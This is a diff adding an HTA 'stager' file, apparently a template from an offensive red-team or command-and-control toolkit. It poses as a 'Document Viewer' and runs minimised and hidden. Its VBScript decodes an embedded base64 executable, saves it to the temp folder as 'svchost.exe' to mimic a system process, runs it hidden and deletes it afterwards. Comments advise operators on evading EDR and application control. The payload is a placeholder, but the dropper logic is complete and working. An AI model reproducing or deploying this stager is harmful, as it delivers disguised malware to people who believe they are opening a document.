@@ -1,0 +1,85 @@
+<html>
+<head>
+<title>Document Viewer</title>
+<!-- ======================================================================
+     Starburst HTA Stager - Drop and Execute
+     ======================================================================
+     Technique:  Base64-decode embedded payload, write to temp, execute
+     OPSEC Notes:
+       - HTA files run via mshta.exe, which is monitored by most EDR.
+       - Dropping a file to disk creates forensic artifacts.
+       - The temp file should be cleaned up after execution.
+       - Parent-child relationship: mshta.exe -> payload.exe is suspicious.
+       - Consider using template_psh.hta for in-memory execution instead.
+       - Mark-of-the-Web (MOTW) may apply depending on delivery method.
+       - HTA execution may be blocked by application control policies.
+       - The embedded base64 payload increases the HTA file size significantly.
+     ====================================================================== -->
+<HTA:APPLICATION
+    ID="StarburstHTA"
+    APPLICATIONNAME="Document Viewer"
+    BORDER="none"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    WINDOWSTATE="minimize"
+/>
+</head>
+<body>
+<script language="VBScript">
+
+' --- OPERATOR: Replace this with base64-encoded payload ---
+' Generate with: certutil -encode starburst.exe payload.b64
+' Then paste the base64 content (without BEGIN/END CERTIFICATE lines) below
+Dim sBase64Payload
+sBase64Payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA" ' PLACEHOLDER — replace with full base64
+
+' --- OPERATOR: Set output filename ---
+Dim sFileName
+sFileName = "svchost.exe"
+
+Sub Window_OnLoad()
+    On Error Resume Next
+
+    ' Decode base64 payload
+    Dim oXML, oNode
+    Set oXML = CreateObject("MSXML2.DOMDocument.6.0")
+    Set oNode = oXML.createElement("b64")
+    oNode.DataType = "bin.base64"
+    oNode.Text = sBase64Payload
+
+    ' Get temp directory and build output path
+    Dim oShell, sTempDir, sOutputPath
+    Set oShell = CreateObject("WScript.Shell")
+    sTempDir = oShell.ExpandEnvironmentStrings("%TEMP%")
+    sOutputPath = sTempDir & "\" & sFileName
+
+    ' Write decoded payload to disk
+    Dim oStream
+    Set oStream = CreateObject("ADODB.Stream")
+    oStream.Type = 1 ' adTypeBinary
+    oStream.Open
+    oStream.Write oNode.nodeTypedValue
+    oStream.SaveToFile sOutputPath, 2 ' adSaveCreateOverWrite
+    oStream.Close
+
+    ' Execute the payload
+    oShell.Run Chr(34) & sOutputPath & Chr(34), 0, False
+
+    ' Schedule cleanup — delete after a short delay to allow execution to start
+    Dim sCleanupCmd
+    sCleanupCmd = "cmd.exe /c ping -n 5 127.0.0.1 >nul & del /f /q " & Chr(34) & sOutputPath & Chr(34)
+    oShell.Run sCleanupCmd, 0, False
+
+    ' Clean up objects
+    Set oStream = Nothing
+    Set oNode = Nothing
+    Set oXML = Nothing
+    Set oShell = Nothing
+
+    ' Close the HTA window
+    window.close
+End Sub
+
+</script>
+</body>
+</html>
